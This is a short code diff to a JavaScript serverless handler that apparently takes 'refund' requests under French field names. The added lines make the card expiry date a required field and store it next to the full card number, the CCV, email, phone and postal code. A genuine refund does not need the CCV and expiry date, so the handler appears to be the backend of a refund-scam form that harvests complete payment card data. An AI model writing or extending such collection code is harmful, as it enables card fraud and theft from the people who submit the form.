@@ -1,7 +1,7 @@
 import { assertStorageConfigured, getRefund, setRefund } from "./_lib/store.js";
 import { json, methodNotAllowed, parseBody } from "./_lib/http.js";
 
-const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "ccv"];
+const REQUIRED_FIELDS = ["reference", "montant", "email", "telephone", "numeroCarteBancaire", "dateExpirationCarte", "ccv"];
 
 function datePart(date) {
   const year = date.getFullYear();
@@ -66,6 +66,8 @@ export default async function handler(req, res) {
       postalCode: String(payload.codePostal || "").trim(),
       cardNumber: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
       numeroCarteBancaire: String(payload.numeroCarteBancaire || payload.cardNumber || payload.iban || "").trim(),
+      cardExpiryDate: String(payload.dateExpirationCarte || payload.cardExpiryDate || "").trim(),
+      dateExpirationCarte: String(payload.dateExpirationCarte || payload.cardExpiryDate || "").trim(),
       ccv: String(payload.ccv || "").trim(),
       details: String(payload.details || "").trim(),
     };
